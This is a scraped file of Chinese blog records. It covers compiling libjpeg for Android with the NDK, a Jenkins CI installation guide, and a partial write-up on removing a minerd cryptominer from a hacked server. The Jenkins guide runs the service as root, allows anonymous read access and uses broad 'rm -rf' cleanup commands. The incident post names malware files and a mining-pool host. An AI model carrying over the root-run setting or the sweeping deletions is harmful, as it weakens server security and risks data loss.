\n下载最新的源码，解压后将所有文件放到jni目录中，准备用ndk编译 \n1、新建config.sh,将ndk中的交叉编译工具加入其中，内容如下：\n\n\n\nNDK=/opt/ndk/android-ndk-r10e/\nPLATFORM=$NDK/platforms/android-9/arch-arm/\nPREBUILT=$NDK/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86/\nCC=$PREBUILT/bin/arm-linux-androideabi-gcc\n./configure --prefix=/home/linc/jpeg-9b/jni/dist --host=arm CC=\"$CC --sysroot=$PLATFORM\"\n\n2、执行此脚本\n\n\n\n$ sh config.sh \n...\nchecking whether to build shared libraries... no\nchecking whether to build static libraries... yes\n...\nconfig.status: creating Makefile\nconfig.status: creating jconfig.h\n\n首先，它生成了Makefile，我们可以直接使用此Makefile进行编译；其次，它生成了重要的头文件，jconfig.h.  \n但是这个Makefile是编译static库而不是共享库的。  \n此时，我们可以执行构建命令进行编译：\n\n\n\njni$ make install-libLTLIBRARIES\nlibtool: install: ranlib /home/linc/jpeg-9b/jni/dist/lib/libjpeg.a\n\n3、Android.mk  \n使用ndk-build指令编译，需要手动编写Android.mk文件，内容如下：\n\n\n\nLOCAL_PATH:= $(call my-dir)\ninclude $(CLEAR_VARS)\n\nLOCAL_ARM_MODE := arm\n\nLOCAL_SRC_FILES :=jaricom.c jcapimin.c jcapistd.c jcarith.c jccoefct.c jccolor.c \\\n        jcdctmgr.c jchuff.c jcinit.c jcmainct.c jcmarker.c jcmaster.c \\\n        jcomapi.c jcparam.c jcprepct.c jcsample.c jctrans.c jdapimin.c \\\n        jdapistd.c jdarith.c jdatadst.c jdatasrc.c jdcoefct.c jdcolor.c \\\n        jddctmgr.c jdhuff.c jdinput.c jdmainct.c jdmarker.c jdmaster.c \\\n        jdmerge.c jdpostct.c jdsample.c jdtrans.c jerror.c jfdctflt.c \\\n        jfdctfst.c jfdctint.c jidctflt.c jidctfst.c jidctint.c jquant1.c \\\n        jquant2.c jutils.c jmemmgr.c jmemnobs.c\n\nLOCAL_C_INCLUDES := $(LOCAL_PATH)\nLOCAL_CFLAGS += -O3 -fstrict-aliasing -fprefetch-loop-arrays \\\n    -DANDROID -DANDROID_TILE_BASED_DECODE -DENABLE_ANDROID_NULL_CONVERT\n\n\nLOCAL_MODULE := libjpeg\n\nLOCAL_MODULE_TAGS := optional\n\n# unbundled branch, built against NDK.\nLOCAL_SDK_VERSION := 17\n\ninclude $(BUILD_SHARED_LIBRARY)\n\n其中LOCAL_SRC_FILES后面的源文件可以参考刚刚生成的Makefile。  \n在jni目录上一级使用ndk-build编译即可。\n\n\n\n$ ndk-build\n[armeabi] Compile arm    : jpeg <= jaricom.c\n...\n[armeabi] Compile arm    : jpeg <= jmemnobs.c\n[armeabi] SharedLibrary  : libjpeg.so\n[armeabi] Install        : libjpeg.so => libs/armeabi/libjpeg.so\n\n在Android项目引入编译好的libjpeg \n首先把so库加载到libs中，然后将编译好的头文件拷贝到项目的jni文件夹下，就可以使用Android的具体函数了，具体使用分为如下几步： \n\n1、将Android的bitmap解码并转换为RGB数据  \n2、为JPEG对象分配空间并初始化  \n3、指定压缩数据源  \n4、获取文件信息  \n5、为压缩设定参数，包括图像大小，颜色空间  \n6、开始压缩  \n7、压缩完毕  \n8、释放资源\n\n#include <string.h>\n#include <android/bitmap.h>\n#include <android/log.h>\n#include <jni.h>\n#include <stdio.h>\n#include <setjmp.h>\n#include <math.h>\n#include <stdint.h>\n#include <time.h>\n#include \"jpeglib.h\"\n#include \"cdjpeg.h\"     /* Common decls for cjpeg/djpeg applications */\n#include \"jversion.h\"       /* for version message */\n#include \"config.h\"\n\n#define LOG_TAG \"jni\"\n#define LOGW(...)  __android_log_write(ANDROID_LOG_WARN,LOG_TAG,__VA_ARGS__)\n#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)\n#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)\n\n#define true 1\n#define false 0\n\ntypedef uint8_t BYTE;\n\nchar *error;\nstruct my_error_mgr {\n  struct jpeg_error_mgr pub;\n  jmp_buf setjmp_buffer;\n};\n\ntypedef struct my_error_mgr * my_error_ptr;\n\nMETHODDEF(void)\nmy_error_exit (j_common_ptr cinfo)\n{\n  my_error_ptr myerr = (my_error_ptr) cinfo->err;\n  (*cinfo->err->output_message) (cinfo);\n  error=myerr->pub.jpeg_message_table[myerr->pub.msg_code];\n  LOGE(\"jpeg_message_table[%d]:%s\", myerr->pub.msg_code,myerr->pub.jpeg_message_table[myerr->pub.msg_code]);\n // LOGE(\"addon_message_table:%s\", myerr->pub.addon_message_table);\n//  LOGE(\"SIZEOF:%d\",myerr->pub.msg_parm.i[0]);\n//  LOGE(\"sizeof:%d\",myerr->pub.msg_parm.i[1]);\n  longjmp(myerr->setjmp_buffer, 1);\n}\n//图片压缩方法\nint generateJPEG(BYTE* data, int w, int h, int quality,\n        const char* outfilename, jboolean optimize) {\n    int nComponent = 3;\n\n    struct jpeg_compress_struct jcs;\n\n    struct my_error_mgr jem;\n\n    jcs.err = jpeg_std_error(&jem.pub);\n    jem.pub.error_exit = my_error_exit;\n        if (setjmp(jem.setjmp_buffer)) {\n            return 0;\n         }\n     //为JPEG对象分配空间并初始化\n    jpeg_create_compress(&jcs);\n    //获取文件信息\n    FILE* f = fopen(outfilename, \"wb\");\n    if (f == NULL) {\n        return 0;\n    }\n    //指定压缩数据源\n    jpeg_stdio_dest(&jcs, f);\n    jcs.image_width = w;\n    jcs.image_height = h;\n    if (optimize) {\n        LOGI(\"optimize==ture\");\n    } else {\n        LOGI(\"optimize==false\");\n    }\n\n    jcs.arith_code = false;\n    jcs.input_components = nComponent;\n    if (nComponent == 1)\n        jcs.in_color_space = JCS_GRAYSCALE;\n    else\n        jcs.in_color_space = JCS_RGB;\n\n    jpeg_set_defaults(&jcs);\n    jcs.optimize_coding = optimize;\n    //为压缩设定参数，包括图像大小，颜色空间\n    jpeg_set_quality(&jcs, quality, true);\n    //开始压缩\n    jpeg_start_compress(&jcs, TRUE);\n\n    JSAMPROW row_pointer[1];\n    int row_stride;\n    row_stride = jcs.image_width * nComponent;\n    while (jcs.next_scanline < jcs.image_height) {\n        row_pointer[0] = &data[jcs.next_scanline * row_stride];\n        //写入数据\n        jpeg_write_scanlines(&jcs, row_pointer, 1);\n    }\n\n    if (jcs.optimize_coding) {\n            LOGI(\"optimize==ture\");\n        } else {\n            LOGI(\"optimize==false\");\n        }\n    //压缩完毕\n    jpeg_finish_compress(&jcs);\n    //释放资源\n    jpeg_destroy_compress(&jcs);\n    fclose(f);\n\n    return 1;\n}\n\ntypedef struct {\n    uint8_t r;\n    uint8_t g;\n    uint8_t b;\n} rgb;\n\n//将java string转换为char*\nchar* jstrinTostring(JNIEnv* env, jbyteArray barr) {\n    char* rtn = NULL;\n    jsize alen = (*env)->GetArrayLength(env, barr);\n    jbyte* ba = (*env)->GetByteArrayElements(env, barr, 0);\n    if (alen > 0) {\n        rtn = (char*) malloc(alen + 1);\n        memcpy(rtn, ba, alen);\n        rtn[alen] = 0;\n    }\n    (*env)->ReleaseByteArrayElements(env, barr, ba, 0);\n    return rtn;\n}\n//jni方法入口\njstring Java_net_bither_util_NativeUtil_compressBitmap(JNIEnv* env,\n        jobject thiz, jobject bitmapcolor, int w, int h, int quality,\n        jbyteArray fileNameStr, jboolean optimize) {\n\n    AndroidBitmapInfo infocolor;\n    BYTE* pixelscolor;\n    int ret;\n    BYTE * data;\n    BYTE *tmpdata;\n    char * fileName = jstrinTostring(env, fileNameStr);\n    //解码Android bitmap信息，并存储值infocolor中\n    if ((ret = AndroidBitmap_getInfo(env, bitmapcolor, &infocolor)) < 0) {\n        LOGE(\"AndroidBitmap_getInfo() failed ! error=%d\", ret);\n        return (*env)->NewStringUTF(env, \"0\");;\n    }\n    if ((ret = AndroidBitmap_lockPixels(env, bitmapcolor, &pixelscolor)) < 0) {\n        LOGE(\"AndroidBitmap_lockPixels() failed ! error=%d\", ret);\n    }\n\n    BYTE r, g, b;\n    data = NULL;\n    data = malloc(w * h * 3);\n    tmpdata = data;\n    int j = 0, i = 0;\n    int color;\n    //将bitmap转换为rgb数据\n    for (i = 0; i < h; i++) {\n        for (j = 0; j < w; j++) {\n            color = *((int *) pixelscolor);\n            r = ((color & 0x00FF0000) >> 16);\n            g = ((color & 0x0000FF00) >> 8);\n            b = color & 0x000000FF;\n            *data = b;\n            *(data + 1) = g;\n            *(data + 2) = r;\n            data = data + 3;\n            pixelscolor += 4;\n\n        }\n\n    }\n    AndroidBitmap_unlockPixels(env, bitmapcolor);\n    //进行压缩\n    int resultCode= generateJPEG(tmpdata, w, h, quality, fileName, optimize);\n    free(tmpdata);\n    if(resultCode==0){\n        jstring result=(*env)->NewStringUTF(env, error);\n        error=NULL;\n        return result;\n    }\n    return (*env)->NewStringUTF(env, \"1\"); //success\n}\n\n新建Android.mk,生成可执行文件:\n\n\n\nLOCAL_PATH:= $(call my-dir)\ninclude $(CLEAR_VARS)\n\nLOCAL_SRC_FILES:= jpeg_compress.cpp\n\nLOCAL_MODULE:= jtest\n\nLOCAL_LDLIBS :=-llog\nLOCAL_LDLIBS += $(LOCAL_PATH)/libjpeg.so\nLOCAL_C_INCLUDES := $(LOCAL_PATH)\n\nLOCAL_MODULE_PATH := $(TARGET_OUT_OPTIONAL_EXECUTABLES)\nLOCAL_MODULE_TAGS := debug \n\ninclude $(BUILD_EXECUTABLE)\n\n本篇博客总结了3种图片压缩的方法，大家可以根据自己的情况进行相应的使用，如有错漏，欢迎留言。\n\n参考文章： \nhttp://blog.csdn.net/lincyang/article/details/51085737", "time": "2018_08_14_11_13_09", "link": "https://blog.csdn.net/u012124438/article/details/66087785", "title": "Android性能优化系列之Bitmap图片优化"}
{"timestamp": "2018_08_14_11_13_09", "desc": "Jenkins 是一款流行的开源持续集成（Continuous Integration）工具，广泛用于项目开发，具有自动化构建、测试和部署等功能。本文以 CentOS7 环境为例，总结了 Jenkins 的安装与配置、邮件功能使用，并接入阿里巴巴的著名开源项目 fastjson，以此演示 Java 项目（SVN+Maven）中 FindBugs/CheckStyle/PMD 等常用插件的使用、单元测试及其覆盖率报告等，力求实战性强。 \n \n作者：王克锋 \n出处：https://kefeng.wang/2017/01/06/jenkins/ \n版权：自由转载-非商用-非衍生-保持署名，转载请标明作者和出处。\n\n\n\n1 安装 Jenkins\n\n官网: https://jenkins.io/\n\n\n\n1.1 安装 JDK/Maven\n\nJenkins 自身采用 Java 开发，所以要必须安装 JDK； \n本文集成的项目基于 Maven 构架，所以 Maven 也必须安装； \n两者的安装方法请参考我的另一篇文章：Tomcat 安装及其单机多实例部署\n\n\n\nexport JAVA_HOME=/usr/java/jdk1.8.0_111\nexport MAVEN_HOME=/opt/apache-maven-3.3.9\n\n\n\n1.2 安装 Jenkins\n\n以下四种方法任选一种，推荐第一种。\n\n\n\n1.2.1 离线安装\n\n\n\n## http://pkg.jenkins-ci.org/redhat/\nwget http://pkg.jenkins-ci.org/redhat/jenkins-2.39-1.1.noarch.rpm ## 下载(也可以Windows下载再转过来)\nsudo rpm --import http://pkg.jenkins-ci.org/redhat/jenkins.io.key ## 公钥\nsudo yum -y install jenkins-*.noarch.rpm\n\n\n\n1.2.2 在线安装\n\n\n\n## http://pkg.jenkins-ci.org/redhat/\nsudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat/jenkins.repo\nsudo rpm --import https://pkg.jenkins.io/redhat/jenkins.io.key\nsudo yum -y install jenkins\n\n\n\n1.2.3 基于 Tomcat 安装\n\n\n安装并启动 Tomcat；\n从官网下载 jenkins.war 至 $CATALINA_BASE/webapps，Tomcat 会自动部署；\n浏览器访问：http://centos:8080/jenkins/\n\n\n\n\n1.2.4 免安装方式\n\n\n\nwget http://mirrors.jenkins.io/war-stable/latest/jenkins.war\nsudo java -jar jenkens.war ## 启动服务，直至看到日志 `Jenkins is fully up and running`\ncurl http://localhost:8080/ ## Jenkins 已就绪\n\n\n\n1.3 调整配置文件\n\n\n\n## sudo vim /etc/sysconfig/jenkins\nJENKINS_USER=\"root\" ## 原值 \"jenkins\" 必须修改，否则权限不足\nJENKINS_PORT=\"8080\" ## 原值 \"8080\" 可以不修改\n## 还有开启 HTTPS 相关参数，此处不打算开启，故不作说明\n\n安装目录: /usr/lib/jenkins \n工作目录: /var/lib/jenkins(对应于环境变量 JENKINS_HOME)\n\n\n\n1.4 启动\n\n\n\nsudo systemctl enable jenkins\nsudo systemctl restart jenkins\n\n查看日志文件: sudo tail -f /var/log/jenkins/jenkins.log\n\n启动后会生成文件 hudson.model.UpdateCenter.xml，需要修改它， \n否则浏览器首次进入时会卡在“Jenkins 正在启动，请稍后…”\n\n\n\n## 原值: http://updates.jenkins-ci.org/update-center.json\n## 新值: http://mirror.xmission.com/jenkins/updates/update-center.json\n## 或者: http://mirror.xmission.com/jenkins/updates/current/update-center.json\nsudo cat /var/lib/jenkins/hudson.model.UpdateCenter.xml\nsudo sed -i 's/updates.jenkins-ci.org/mirror.xmission.com\\/jenkins\\/updates/g' /var/lib/jenkins/hudson.model.UpdateCenter.xml\nsudo cat /var/lib/jenkins/hudson.model.UpdateCenter.xml\nsudo systemctl restart jenkins\n\n\n\n1.5 防火墙放行\n\n\n\n### sudo vim /etc/sysconfig/iptables\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 8080 -j ACCEPT\n### 重启生效: sudo systemctl restart iptables\n\n\n\n1.6 卸载\n\n如果要重装，或者本机不需要 Jenkins，可卸载：\n\n\n\nsudo systemctl stop jenkins\nsudo systemctl disable jenkins\nsudo yum -y remove jenkins\nsudo rm -rf /var/{lib,log,cache}/jenkins /usr/lib/jenkins /root/.jenkins\nsudo rm -rf `sudo find /{etc,var,run} -name \"jenkins*\"`\n\n\n\n2 基本配置\n\n\n\n2.1 登录\n\n浏览器进入 http://centos:8080/ \n首次进入需要输入初始密码来解锁，初始密码查看方法: sudo cat /var/lib/jenkins/secrets/initialAdminPassword \n \n进入 Jenkins 定制界面，让选择 Install suggested plugins 或 Select plugins to install 时，两者都不要选，直接关闭，下一个界面点击“Start using Jenkins”； \n \n修改登录密码：主界面右上角“注销”链接的左边的用户名下拉菜单中点“设置”。\n\n\n\n2.2 安全设置\n\n默认情况下，任何用户都可以使用 Jenkins 进行发布。 \n可以进入相关设置：系统管理 / Configure Global Security, \n选择 Jenkins专有用户数据库，不要选中 允许用户注册； \n选择 登录用户可以做任何事，选中 Allow anonymous read access\n\n\n\n2.3 插件安装方法\n\n如果安装插件失败率很高，可设置翻墙，请参考我之前的文章：翻墙代理 Shadowsocks 使用详解\n\n\n\n2.3.1 离线安装\n\n手工下载(*.hpi): http://updates.jenkins-ci.org/download/plugins/ \n进入：系统管理 / 管理插件 / 高级，然后上传插件进行安装。 \n无需重启 Jenkins 插件即生效。\n\n\n\n2.3.2 在线安装\n\n进入：系统管理 / 管理插件 / 可选插件 \n查找并勾选所需插件，点击“直接安装”； \n无需重启 Jenkins 插件即生效。如遇失败可重试或离线安装。 \n\n\n\n\n2.4 工具设置\n\n进入：系统管理 / Global Tool Configuration \n    JDK 下不勾选“自动安装”，指定别名=JDK-1.8.0.111, JAVA_HOME=/usr/java/jdk1.8.0_111 \n    Maven 下不勾选“自动安装”，指定别名=Maven-3.3.9, MAVEN_HOME=/opt/apache-maven-3.3.9 \n    点击 Save 按钮。 \n    重启 Jenkins 后生效：sudo systemctl restart jenkins \n\n\n\n\n3 Maven(SVN) 项目接入\n\n\n\n3.1 准备 SVN 源码\n\n使用 alibaba 的 fastjson 来演示： \n下载: https://github.com/alibaba/fastjson/archive/master.zip \nSVN地址: svn://centos/repo1/fastjson\n\n\n\n3.2 安装相关插件\n\n\nSubversion Plug-in ## 版本管理 SVN 的插件\nGit plugin         ## 版本管理 GIT 的插件\nMaven Integration plugin ## 项目构建 Maven 的插件\nGradle Plugin            ## 项目构建 Gradle 的插件 \n无需重启 Jenkins 插件即生效。如遇失败可重试或离线安装。\n\n\n\n\n3.3 新建构建项目\n\n\n\n3.3.1 开始创建\n\n主页：点击“新建”； \n项目类型：输入项目名称 fastjson，类型选择“构建一个Maven项目”(如果没有此项可选，请检查插件“Maven Integration plugin”是否已安装)； \n\n\n\n\n3.3.2 源码管理\n\n选择“Subversion”(如果没有此项可选，请检查插件“Subversion Plug-in”是否已安装)， \n仓库URL可以指定 svn/http/https 之一，这里指定 svn://centos/repo1/fastjson \nCredentials: 添加 SVN 用户名密码，并从下拉列表中选择它。 \n\n\n\n\n3.3.3 定时触发构建\n\n构建触发器: 只选中 Build periodically, “日程表”格式与 crontab 相似但有细微差别，示例如下：\n\n\n\n## 每行由 5 个值组成(空格或TAB分隔)，分别表示分(0-59)、时(0-23)、日(1-31)、月(1-12)、周(0-7, 0/7=周日)\n## \"M,N\" 表示M和N；\"M-N\" 表示范围[M,N]；\"M-N/X\" 表示范围[M,N]内每隔X；\"*/X\" 表示整个范围内每隔X\n## 前面提到的M/N/X的值都可以用H(意为Hash)代替，散列值起到随机值的效果，且同一项目取值稳定，这对于项目多时分散压力很有用。\nH/10  H(0-8)  *  *  1-5   ## 触发时间: 工作日、Hour为0~8按哈希随机、Minute以10为间隔\nH/10  H       *  *  0,6,7 ## 触发时间: 周末、Hour为全天按哈希随机、Minute以10为间隔\n## “日程表”修改后，下方会给出下次执行时间点的预告。\n\n\n\n\n\n3.3.4 版本提交触发构建\n\n构建触发器: 只选中 Poll SCM，可指定检查 SVN 代码是否有提交的时间：\n\n\n\n## 格式与 \"Build periodically\" 相同\nH/10  *  *  *  *  ## 任何时候，每隔 30 分钟就检测一次 SVN，如果有提交就启动构建\n\n\n\n\n\n3.3.5 Build 设置\n\nRoot POM: 指定 pom.xml 相对路径 \nGoals and options: 指定 mvn 执行目标或选项，设置为 package -Dmaven.test.skip=true\n\n\n\n3.3.6 Post Steps 设置\n\n定制构建后的操作，通常选择“Run only if build succeeds”，支持 shell 等脚本；\n\n\n\n## 脚本工作目录为: /var/lib/jenkins/workspace/fastjson\n# sudo systemctl stop tomcat\n# sudo cp -f target/*.war /opt/apache-tomcat-8.5.9/webapps/\n# sudo systemctl start tomcat\nls -l target/*.?ar\n\n\n\n\n\n3.4 手工触发构建\n\n进入 My Views, 右侧看到各个项目； \n点击进入关注的项目，点击左侧的“立即构建”； \n \n开始构建或构建完毕后，左下方列出每次构建的链接，点击进入某次构建； \n点击左侧的“Console Output”，可查看构建日志，如有报错可以看到； \n \n纠正错误后，返回到工程，再次点击“立即构建”，直至构建成功； \n如有网络相关报错，重试几次也会成功。\n\n\n\n4 开启 Java 代码静态检查\n\n\n\n4.1 安装相关插件\n\n如果是离线安装，需要先依次安装被依赖的插件：\n\n\nScript Security Plugin\nMatrix Project Plugin\nStatic Analysis Utilities\n\n\n再安装直接被使用的插件：\n\n\nFindBugs Plug-in\nCheckstyle Plug-in\nPMD Plug-in\n\n\n插件官方资料： \nFindBugs: https://wiki.jenkins-ci.org/display/JENKINS/FindBugs+Plugin \nCheckstyle: http://maven.apache.org/plugins/maven-checkstyle-plugin/usage.html \nPMD: http://maven.apache.org/plugins/maven-pmd-plugin/usage.html\n\n\n\n4.2 Maven 中设置插件(pom.xml)\n\n\n\n<project ...>\n    <properties>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n        <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>\n    </properties>\n\n    <!-- ...... -->\n\n    <reporting>\n        <plugins>\n            <plugin>\n                <groupId>org.codehaus.mojo</groupId>\n                <artifactId>findbugs-maven-plugin</artifactId>\n                <version>3.0.4</version>\n                <configuration>\n                    <xmlOutput>true</xmlOutput>\n                    <findbugsXmlOutput>true</findbugsXmlOutput>\n                    <findbugsXmlWithMessages>true</findbugsXmlWithMessages>\n                </configuration>\n            </plugin>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-checkstyle-plugin</artifactId>\n                <version>2.17</version>\n                <configuration>\n                    <linkXRef>false</linkXRef>\n                    <failsOnError>true</failsOnError>\n                    <consoleOutput>true</consoleOutput>\n                    <configLocation>checkstyle.xml</configLocation>\n                </configuration>\n            </plugin>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-pmd-plugin</artifactId>\n                <version>3.7</version>\n                <configuration>\n                    <linkXref>false</linkXref>\n                </configuration>\n            </plugin>\n        </plugins>\n    </reporting>\n</project>\n\n\n\n4.3 修改 Jenkins 构建配置\n\n\n\n\n\n4.3.1 设置 Maven\n\n“Build”标签页，Goals and options 设置为： \npackage -Dmaven.test.skip=true findbugs:findbugs checkstyle:checkstyle pmd:pmd\n\n\n\n4.3.2 开启相关报告\n\n“构建设置”标签页，打开以下三个选项：\n\n\nPublish FindBugs analysis results\nPublish Checkstyle analysis results\nPublish PMD analysis results\n\n\n\n\n4.4 构建后查看报告\n\n构建后进入构建页面，从左边点击查看报告：\n\n\nFindBugs Warnings\nCheckstyle Warnings\nPMD Warnings \n\n\n\n\n\n5 开启邮件报告\n\nJenkins 的邮件发送，原理与邮件客户端一样：把发件人的邮箱帐号、密码、SMTP服务器告诉 Jenkins，Jenkins 需要时使用该帐号向指定的收件人发送邮件报告。\n\n\n\n5.1 安装相关插件\n\nJenkins 自带邮件插件(Mailer Plugin)的功能很弱且无法自定制， \n需要安装扩展邮件插件: Email Extension Plugin\n\n\n\n5.2 全局统一设置\n\n以 admin@company.com 为例，如下图设置： \n\n\n\n\n5.2.1 设置管理员邮箱\n\n进入：系统管理 / 系统设置 / Jenkins Location \n系统管理员邮件地址 设为 admin@company.com\n\n\n\n5.2.2 设置发件人帐号\n\n进入：系统管理 / 系统设置 / Extended E-mail Notification \n    “SMTP server” 设为 smtp.company.com \n    “Default user E-mail suffix” 设为 @company.com \n    “Use SMTP Authentication” 选中 \n    “User Name” = admin@company.com(必须与管理员邮箱相同) \n    “Password” = ** \n    “Use SSL” = on \n    “SMTP port” = 465 \n    “Charset” = UTF-8 \n    “Default Content Type” = HTML (text/html)\n\n\n\n5.2.3 设置邮箱模板\n\nDefault Subject: 构建通知：PROJECTNAME−#PROJECTNAME−#PROJECT_NAME - \\#BUILD_NUMBER - $BUILD_STATUS \nDefault Content:\n\n\n\n本邮件由系统自动发出，请勿回复！<br/>\n<h2><font color=\"#CC0000\">构建结果 - ${BUILD_STATUS}</font></h2>\n\n<h4><font color=\"#0B610B\">构建信息</font></h4>\n<hr size=\"2\" width=\"100%\" />\n<ul>\n    <li>项目名称：${PROJECT_NAME} - #${BUILD_NUMBER}</li>\n    <li>触发原因：${CAUSE}</li>\n    <li>项目 URL：<a href=\"${PROJECT_URL}\">${PROJECT_URL}</a></li>\n    <li>构建 URL：<a href=\"${BUILD_URL}\">${BUILD_URL}</a></li>\n    <li>构建日志：<a href=\"${BUILD_URL}console\">${BUILD_URL}console</a></li>\n    <li>工作目录：<a href=\"${PROJECT_URL}ws\">${PROJECT_URL}ws</a></li>\n</ul>\n\n<h4><font color=\"#0B610B\">失败用例</font></h4>\n<hr size=\"2\" width=\"100%\" />\n$FAILED_TESTS<br/>\n\n<h4><font color=\"#0B610B\">最近提交(#$SVN_REVISION)</font></h4>\n<hr size=\"2\" width=\"100%\" />\n<ul>\n${CHANGES_SINCE_LAST_SUCCESS, reverse=true, format=\"%c\", changesFormat=\"<li>%d [%a] %m</li>\"}\n</ul>\n详细提交: <a href=\"${PROJECT_URL}changes\">${PROJECT_URL}changes</a><br/>\n\n<h4><font color=\"#0B610B\">代码检查</font></h4>\n<hr size=\"2\" width=\"100%\" />\nFindBugs：<a href=\"${BUILD_URL}findbugsResult\">${BUILD_URL}findbugsResult</a><br/>\nCheckStyle：<a href=\"${BUILD_URL}checkstyleResult\">${BUILD_URL}checkstyleResult</a><br/>\nPMD：<a href=\"${BUILD_URL}pmdResult\">${BUILD_URL}pmdResult</a><br/>\n\n也可以自定义 Jelly 模板，并在 Default Content 中引用 ${JELLY_SCRIPT, template=\"html_gmail\"}：\n\n\n\nsudo mkdir -p /var/lib/jenkins/email-templates\nsudo cd /var/lib/jenkins/email-templates\nsudo wget https://github.com/jenkinsci/email-ext-plugin/raw/master/src/main/resources/hudson/plugins/emailext/templates/html_gmail.jelly\n# 更多模板列表: https://github.com/jenkinsci/email-ext-plugin/tree/master/src/main/resources/hudson/plugins/emailext/templates\n\n\n\n5.2.4 设置邮件触发时机\n\n点击 Default Triggers，比较好的方案是选中两项：\n\n\nFailure - Any ## 可定义“编译失败时”才向哪些人员发邮件(比如最近代码提交者)\nSuccess       ## 可定义“构建成功时”才向哪些人员发邮件(比如所有产品关注者)\n\n\n\n\n5.2.5 邮件可用变量\n\n点击 Content Token Reference 右侧的问号图标，可以看到各邮件模板中可引用变量的含义。\n\n\n\n5.2.6 邮件未发送问题排查\n\n构建设置里指定的收件人只是 kevin，没有后续，希望采用插件 Email Extension Plugin 中的邮箱后缀， \n却发现构建日志中报错: Failed to send e-mail to kevin because no e-mail address is known, and no default e-mail domain is configured \n原来，扩展邮件插件有BUG，使用的是自带邮件插件的后缀设置，而后者之前没有设置。 \n点击 保存，保存邮件全局设置。\n\n\n\n5.3 项目设置中启用邮件\n\n构建后操作步骤: 增加 Editable Email Notification(来自插件 Email Extension Plugin)。下图设置的效果是：\n\n\n构建失败时，向上次成功构建之后导致构建失败的 SVN 提交的人员发送邮件；\n构建成功时，向上次成功构建之后有 SVN 提交的人员、还有“Project Recipient List”中的人员发送邮件；\n\n\n\n\n\n\n5.4 验证构建报告邮件\n\n分别按以下三种情形触发构建，都能看到构建报告邮件：\n\n\n手工触发：进入工程后，点击“立即构建”；\n定时触发构建：“构建触发器”只选中 Build periodically；\n版本提交触发构建：“构建触发器”只选中 Poll SCM。 \n\n\n\n6 Java/JUnit 单元测试\n\n\n\n6.1 Maven 中设置插件(pom.xml)\n\n\n\n<project ...>\n    <reporting>\n        <plugins>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-surefire-plugin</artifactId>\n                <version>2.19.1</version>\n            </plugin>\n        </plugins>\n    </reporting>\n</project>\n\n\n\n6.2 修改 Jenkins 构建配置\n\n“Build”标签页，Goals and options：确保去掉-Dmaven.test.skip=true即可。\n\n\n\n6.3 构建后查看单元测试报告\n\n\n\n\n\n7 单元测试覆盖率报告\n\n\n\n7.1 安装插件\n\nJaCoCo plugin：与插件 Cobertura 一样，用于生成覆盖率报告，但比 Cobertura 更易用。\n\n\n\n7.2 调整工程 pom.xml\n\n\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.jacoco</groupId>\n                <artifactId>jacoco-maven-plugin</artifactId>\n                <version>0.7.8</version>\n                <executions>\n                    <execution>\n                        <id>prepare</id>\n                        <goals>\n                            <goal>prepare-agent</goal>\n                        </goals>\n                    </execution>\n                    <execution>\n                        <id>report</id>\n                        <phase>package</phase>\n                        <goals>\n                            <goal>report</goal>\n                        </goals>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n\n\n\n7.3 调整项目的构建设置\n\n项目的构建设置 Post Build Action 中，增加 “Record JaCoCo coverage report”，并设置期望的覆盖率阈值。 \n\n\n\n\n7.4 构建并查看报告\n\n构建完成后，点击本次构建页的“Coverage Report”查看报告： \n\n\n\n\n8 更多有用插件\n\n\nFolders Plugin：可嵌套地定义文件夹来级别 views / jobs；\nbuild timeout plugin：允许用户中止耗时太久的构建；\nDingding[钉钉] Plugin：允许向阿里钉钉发送构建通知；\nTestNG Results Plugin: 用 TestNG 代替 JUnit；\nPublish Over SSH: 通过SSH发布文件或执行命令(使用SFTP的SCP)。", "time": "2018_08_14_11_13_09", "link": "https://blog.csdn.net/kefengwang/article/details/54233584", "title": "Jenkins 持续集成综合实战"}
{"timestamp": "2018_08_14_11_13_10", "desc": "记录一次服务器被入侵的解决方法\n\n \n一：问题说明 \n1、我的服务器是使用的阿里云的CentOS，收到的阿里云发来的提示邮件如下\n\n \n \n然后我查看了运行的进程情况（top 命令），看到一个名为minerd的进程占用了99.5%的CPU \n \n \n2、minerd是个挖矿程序，什么是“挖矿”，特此百度了一下，\n\n \n所谓“挖矿”实质上是用计算机解决一项复杂的数学问题，来保证比特币网络分布式记账系统的一致性。比特币网络会自动调整数学问题的难度，让整个网络约每10分钟得到一个合格答案。随后比特币网络会新生成一定量的比特币作为赏金，奖励获得答案的人。 \n比特币的本质其实就是一堆复杂算法所生成的特解。特解是指方程组所能得到无限个（其实比特币是有限个）解中的一组。而每一个特解都能解开方程并且是唯一的。[8]  以人民币来比喻的话，比特币就是人民币的序列号，你知道了某张钞票上的序列号，你就拥有了这张钞票。而挖矿的过程就是通过庞大的计算量不断的去寻求这个方程组的特解，这个方程组被设计成了只有 2100 万个特解，所以比特币的上限就是 2100 万。[8] \n \n所以才会这么占CPU。 \n \n二：解决方法  \n1、网上看到有人遇到了同样的问题，链接地址： \nhttp://blog.csdn.net/hu_wen/article/details/51908597 \n文中使用了StackExchange上一个回答的解决方法： \nhttp://security.stackexchange.com/questions/129448/how-can-i-kill-minerd-malware-on-an-aws-ec2-instance\n\n \n \n尝试使用上述步骤解决： \n（1）关闭访问挖矿服务器的访问 iptables -A INPUT -s xmr.crypto-pool.fr -j DROP 和 iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP \n \n（2）删除/usr/local/etc 下root文件中的内容 \n \n \n \n（3）删除yam 文件（我的yam文件不是在上面说的/opt目录下的，使用find命令查找，然后删除） \n \n \n（4）删除 /root/.ssh/KHK75NEOiq \n \n \n（5）删除/opt/minerd 和 /opt/KHK75NEOiq33 \n \n \n（6）杀死minerd进程，pkill minerd 或者kill -9 进程Id \n \n（7）前面步骤没有问题，到这里我是没有lady 